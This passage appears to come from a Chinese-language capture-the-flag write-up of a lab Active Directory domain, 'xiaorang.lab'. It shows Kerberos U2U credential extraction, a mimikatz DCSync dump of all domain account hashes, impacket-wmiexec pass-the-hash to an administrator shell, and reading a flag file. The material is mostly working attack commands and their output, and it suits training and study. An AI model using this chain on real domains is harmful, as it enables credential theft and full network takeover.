  EndTime                  :  2023/1/13 2:43:12
  RenewTill                :  2023/1/19 16:43:12
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  vAVE/WwsDvrI8pgRYhCTtQ==
  ASREP (key)              :  F8EED91C649F123B981D0E0A70FB7B10

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 9169E4194917B2B3AFF066112E13CADF
PS C:\Users\zhangfeng\Desktop>
```

在获取域控凭证后，使用 dcsync 获取域管的 hash：

```

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /domain:xiaorang.lab /all /csv
[DC] 'xiaorang.lab' will be the domain
[DC] 'DC02.xiaorang.lab' will be the DC server
[DC] Exporting domain 'xiaorang.lab'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
502     krbtgt  f482e9cdc1e54f20115c819c357aad25        514
1105    zhangjie        d373cc14dad704a435374ae76f2bd5f1        512
1107    chenyong        43642e6cbeefcee293d620776301edf6        512
1111    liliang a6d33fcd4de8a9ffc3416f2242bf5b78        512
1114    zhangli c6ab275bd295703fc7ee5e8c353da7a8        512
1115    zhangyong       35009ba197a156ade1e11e261cf8a6c9        512
1116    lijun   88684b83e6da3d313dbf86a6de1b54ae        512
1118    zhangpeng       3006a7483ad9fd2ceaad9f37d984d576        512
1119    zhangjian       d9c0482c58aec0e02fe3d0f023461667        512
1120    liting  5161d934b6ad9bd1aa01a30a6801372f        512
1121    chentao a7075106600550c52b2cdc5edb5834ba        512
1122    chenjun 82f86ea3c3fceec2794a97b42b61169f        512
1123    liuping 1bbaef8f0b4521e73d0554d2088220a9        512
1124    zhangkai        5d3fa8c0fefed5c2a1703451c030c8ba        512
1125    chenjian        16f469fe8dd11da80f54b996d76a1344        512
1117    chenwei 8e4a7fa8c9ff82d158016d3fa4a31319        512
500     Administrator   bf967c5a0f7256e2eaba589fbd29a382        512
1110    zhangfeng       97db334121c5d97762be2bf549a5eb34        512
1103    ADCS$   b18625dff18d645cae5a31bf5021a548        4096
1104    WIN-9BMCSG0S$   01cac4c772f597d1654eb4a7f0db2cbe        4096
1000    DC02$   9169e4194917b2b3aff066112e13cadf        532480

mimikatz #
```

使用 wmiexec 进行 pth：

```
┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-wmiexec XIAORANG/Administrator@172.22.7.6 -hashes :bf967c5a0f7256e2eaba589fbd29a382 -codec GBK 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
xiaorang\administrator

C:\>

...

C:\Users\Administrator\flag>type flag03.txt
 __    __                                  __      __                            __                            __                                           
/  |  /  |                                /  |    /  |                          /  |                          /  |                                          
$$ |  $$ | _______    ______   __    __  _$$ |_   $$ |____    ______    ______  $$/  ________   ______    ____$$ |                                          
$$ |  $$ |/       \  /      \ /  |  /  |/ $$   |  $$      \  /      \  /      \ /  |/        | /      \  /    $$ |                                          
$$ |  $$ |$$$$$$$  | $$$$$$  |$$ |  $$ |$$$$$$/   $$$$$$$  |/$$$$$$  |/$$$$$$  |$$ |$$$$$$$$/ /$$$$$$  |/$$$$$$$ |                                          
$$ |  $$ |$$ |  $$ | /    $$ |$$ |  $$ |  $$ | __ $$ |  $$ |$$ |  $$ |$$ |  $$/ $$ |  /  $$/  $$    $$ |$$ |  $$ |                                          
$$ \__$$ |$$ |  $$ |/$$$$$$$ |$$ \__$$ |  $$ |/  |$$ |  $$ |$$ \__$$ |$$ |      $$ | /$$$$/__ $$$$$$$$/ $$ \__$$ |                                          
$$    $$/ $$ |  $$ |$$    $$ |$$    $$/   $$  $$/ $$ |  $$ |$$    $$/ $$ |      $$ |/$$      |$$       |$$    $$ |                                          
 $$$$$$/  $$/   $$/  $$$$$$$/  $$$$$$/     $$$$/  $$/   $$/  $$$$$$/  $$/       $$/ $$$$$$$$/  $$$$$$$/  $$$$$$$/                                           
                                                                                                                                                            
flag04：flag{88865616-c88e-4f32-8f78-8a8a38bc8815}
C:\Users\Administrator\flag>
```
